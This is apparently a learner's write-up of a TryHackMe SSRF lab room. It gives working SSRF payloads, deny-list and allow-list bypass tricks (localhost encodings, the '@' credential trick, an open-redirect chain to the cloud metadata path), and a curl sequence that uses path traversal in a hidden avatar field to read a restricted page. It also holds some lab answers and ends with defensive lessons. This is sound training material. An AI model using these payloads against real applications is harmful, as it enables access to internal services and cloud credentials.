# Intro to SSRF (TryHackMe)

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities I
- **Completed:** 2026-10-10 - **Task 5 lab:** Acme IT Support @ <ip>:80 (driven over VPN)

SSRF = make the SERVER send a request to a destination you choose (internal service, cloud metadata,
your own box). Exploits the trust internal systems place in the app server's network position.
Two kinds: Regular (response reflected back to you) and Blind (no response; confirm via callback/
timing/errors).

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 1 | SSRF stands for | *(find it yourself)* |
| 1 | Other type vs regular | *(find it yourself)* |
| 2 | SSRF Examples flag | (got in the View Site; payload below) |
| 3 | Which URL is likely vulnerable | *(find it yourself)* |
| 4 | Method to bypass strict rules | *(find it yourself)* |
| 4 | Cloud IP with sensitive data | <ip> |
| 4 | List that permits only certain input | *(find it yourself)* |
| 4 | List that stops certain input | *(find it yourself)* |
| 5 | Flag from /private | THM{…} |

## SSRF vectors (Task 2/3)
- Full URL in a parameter (?url=, ?server=): most direct.
- Partial URL (hostname only): app builds the rest; supply your own host.
- Path only: use path traversal (/../admin) to reach other endpoints.
- Hidden form fields: value controls a server-side fetch (e.g. avatar path). Only visible in source
  or a proxy. <- this was the Task 5 vector.
Indicators: a hostname/URL/path in a request that the server goes and fetches. Features: webhooks,
PDF/report generation, URL preview/unfurl, file import by URL, integration settings.

## Task 2 payload (View Site simulation)
App builds `https://<server>.website.thm/api/item?id=2`. Set server param to:
   server.website.thm/flag?id=9&x=
-> `https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2`. The &x= turns the appended
tail into a junk parameter, so the server effectively fetches /flag?id=9. The "Server Requesting"
bar at the bottom of the mock browser confirms the real outbound URL.

## Defeating defences (Task 4)
- Deny list (blocks known-bad): fragile. 127.0.0.1 has many forms (decimal 2130706433, octal, 127.1,
  0, [::1], 127.0.0.1.nip.io). Cloud metadata <ip> can be reached via a DNS record you
  control pointing at it.
- Allow list (permit only matching): stronger, but string-prefix checks are bypassable:
  https://website.thm.attacker.thm (subdomain), https://website.thm@attacker.com/ (credential-@
  trick). Root cause: validating the URL string instead of parsing it.
- Open redirect: if only website.thm URLs are allowed, chain an on-site redirect:
  https://website.thm/link?url=http://<ip>/latest/meta-data/ satisfies the allow list,
  then the server follows the redirect to the metadata service.

## Task 5 practical - hidden field + traversal deny-list bypass (done over VPN)
Acme IT Support avatar feature: a hidden form field `avatar` holds an image path; the server FETCHES
that path and base64-encodes the result into the page (data: URI). /private is IP-restricted (server
only). A deny list blocks paths starting with /private, but it checks the RAW string, so:
   avatar = x/../private   (passes the check; web server normalises to /private and fetches it)
Full curl chain:
```
curl -s -c cookies.txt -d "username=hacker1&email=h@test.thm&password=Pass123!&cpassword=Pass123!" http://<ip>/customers/signup
curl -s -b cookies.txt -c cookies.txt -d "username=hacker1&password=Pass123!" http://<ip>/customers/login
curl -s -b cookies.txt -d "avatar=x/../private" http://<ip>/customers/new-account-page -o out.html
grep -oaE 'base64,[A-Za-z0-9+/=]+' out.html | head -1 | cut -d, -f2 | base64 -d   # -> THM{…}
```
Note: the avatar form posts to /customers/new-account-page (not /customers/account); avatar values
are relative (assets/avatars/N.png), so a relative x/../private normalises to /private.

## Lessons / defence
- SSRF turns the trusted server into your proxy into the internal network / cloud metadata.
- Validation stage matters: the deny list checked the path BEFORE normalisation, the server resolved
  it AFTER -> traversal slips through. Same class as file-inclusion traversal, applied to URLs.
- Defences: parse URLs properly (don't string-match), allowlist exact hosts, resolve+validate the
  final IP (block <ip>/8, <ip>/16, RFC1918), disable unneeded redirects, and put the
  metadata service behind IMDSv2 / network policy.
